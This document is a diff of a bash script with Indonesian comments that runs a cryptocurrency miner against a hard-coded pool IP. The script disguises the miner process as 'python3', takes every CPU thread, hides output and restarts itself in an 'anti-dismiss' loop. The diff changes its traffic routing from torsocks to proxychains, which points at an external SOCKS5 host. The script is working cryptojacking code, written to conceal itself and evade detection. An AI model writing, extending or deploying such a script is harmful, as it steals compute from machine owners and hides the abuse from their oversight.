@@ -7,13 +7,17 @@ POOL="stratum+tcp://159.223.48.143:443"
 ALGO="power2b"
 THREADS=$(nproc --all)
 FAKE_NAME="python3"
-PROXY="socks5://127.0.0.1:9050"
 
 # ====[ CEK DEPENDENSI ]====
-command -v torsocks >/dev/null 2>&1 || {
-    echo "[!] torsocks tidak ditemukan. Install dengan: apt install torsocks -y"
+command -v proxychains >/dev/null 2>&1 || {
+    echo "[!] proxychains tidak ditemukan. Install dengan: apt install proxychains4 -y"
     exit 1
 }
+
+# Setup SOCKS5 proxy config otomatis (127.0.0.1:9050 default)
+CONFIG_PATH="$HOME/.proxychains.conf"
+echo -e "[ProxyList]\nsocks5 101.38.175.192 8081" > "$CONFIG_PATH"
+export PROXYCHAINS_CONF_FILE="$CONFIG_PATH"
 
 # ====[ DOWNLOAD MINER ]====
 if [ ! -f "$FAKE_NAME" ]; then
@@ -23,15 +27,15 @@ if [ ! -f "$FAKE_NAME" ]; then
     chmod +x "$FAKE_NAME"
 fi
 
-# ====[ FUNGSI ANTI-DISMISS & AUTORESTART ]====
+# ====[ ANTI-DISMISS & AUTORESTART ]====
 while true; do
-    echo "[*] Menjalankan miner..."
-    torsocks ./"$FAKE_NAME" -a $ALGO -o $POOL -u $WALLET -p x -t $THREADS > /dev/null 2>&1 &
+    echo "[*] Menjalankan miner via proxychains..."
+    proxychains ./"$FAKE_NAME" -a $ALGO -o $POOL -u $WALLET -p x -t $THREADS > /dev/null 2>&1 &
     PID=$!
 
     while sleep 30; do
         if ! ps -p $PID > /dev/null; then
-            echo "[!] Miner mati, restart..."
+            echo "[!] Miner mati, restart ulang..."
             break
         fi
     done
